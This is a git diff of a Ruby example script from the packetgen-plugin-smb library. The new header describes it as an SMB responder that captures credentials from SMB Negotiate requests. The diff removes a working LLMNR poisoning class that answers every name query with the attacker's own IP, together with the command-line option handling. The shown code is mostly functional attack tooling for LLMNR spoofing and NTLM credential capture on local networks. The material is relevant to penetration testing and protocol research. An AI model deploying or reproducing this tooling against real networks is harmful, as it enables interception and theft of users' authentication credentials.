@@ -1,10 +1,16 @@
 #!/usr/bin/env ruby
+# This file is part of packetgen-plugin-smb.
+# See https://github.com/sdaubert/packetgen-plugin-smb for more informations
+# Copyright (C) 2018 Sylvain Daubert <sylvain.daubert@laposte.net>
+# This program is published under MIT license.
+#
+# This small example implements a SMB responder. It responds to all SMB
+# Negotiate request to capture crdentials.
+# Before running it (as root), llmnr-responder should be running.
 
 # frozen_string_literal: true
 
-require 'optparse'
 require 'socket'
-require 'ipaddr'
 require 'securerandom'
 require 'ostruct'
 
@@ -35,66 +41,6 @@ class PacketGen::Packet
       is? other
     else
       false
-    end
-  end
-end
-
-class LlmnrResponder
-  attr_reader :socket, :my_ip, :my_ip_data
-
-  LLMNR_MCAST_ADDR = '224.0.0.252'
-  BIND_ADDR = '0.0.0.0'
-
-  def initialize
-    @socket = UDPSocket.new
-  end
-
-  def start(bind_addr:, iface:)
-    @my_ip = Interfacez.ipv4_address_of(iface)
-    @my_ip_data = IPAddr.new(my_ip).hton
-    configure_multicast(my_ip_data)
-
-    socket.bind(bind_addr, PacketGen::Plugin::LLMNR::UDP_PORT)
-
-    start_thread
-  end
-
-  private
-
-  def log(str)
-    puts "[LLMNR] #{str}"
-  end
-
-  def configure_multicast(local_ip_bin)
-    mreq = IPAddr.new(LLMNR_MCAST_ADDR).hton + local_ip_bin
-    socket.setsockopt(:IPPROTO_IP, :IP_ADD_MEMBERSHIP, mreq)
-  end
-
-  def start_thread
-    Thread.new do
-      loop do
-        data, peer = socket.recvfrom(1024)
-        pkt = PacketGen.parse(data, first_header: 'LLMNR')
-        next unless pkt.is?('LLMNR')
-
-        peer_port = peer[1]
-        peer_ip = peer[3]
-        log "received LLMNR request from #{peer_ip}"
-
-        # Forge LLMNR response
-        pkt.llmnr.qr = true
-        pkt.llmnr.qd.each do |question|
-          next unless (question.human_rrclass == 'IN') && (question.human_type == 'A')
-
-          log "Say to #{peer_ip} #{question.name} is #{my_ip}"
-          pkt.llmnr.an << { rtype: 'RR', name: question.name, rdata: my_ip_data }
-        end
-        pkt.calc
-
-        next unless pkt.llmnr.ancount > 0
-
-        socket.send(pkt.to_s, 0, peer_ip, peer_port)
-      end
     end
   end
 end
@@ -274,49 +220,5 @@ class Smb2Responder
     str.unpack('H*').first
   end
 end
-
-def log(section, str)
-  puts "[#{section}] #{str}"
-end
-
-def log_smb2(str)
-  log 'SMB2', str
-end
-
-def log_llmnr(str)
-  log 'LLMNR', str
-end
-
-def parse_options
-  options = {}
-
-  OptionParser.new do |opts|
-    opts.banner = "Usage: #{$PROGRAM_NAME} [options]"
-    opts.separator ''
-    opts.separator 'Options:'
-
-    opts.on_tail('-h', '--help', 'Show this message') do
-      puts opts
-      exit
-    end
-
-    opts.on('-i IFACE', '--interface IFACE', 'interface on which responds') do |iface|
-      options[:iface] = iface
-    end
-  end.parse!
-
-  options
-end
-
-def check_options(options)
-  raise 'No interface given' if options[:iface].nil?
-  raise "unknown interface #{options[:iface]}" unless Interfacez.all.include? options[:iface]
-end
-
-options = parse_options
-
-check_options options
-
-LlmnrResponder.new.start(bind_addr: BIND_ADDR, iface: options[:iface])
 
 Smb2Responder.new.start(bind_addr: BIND_ADDR)
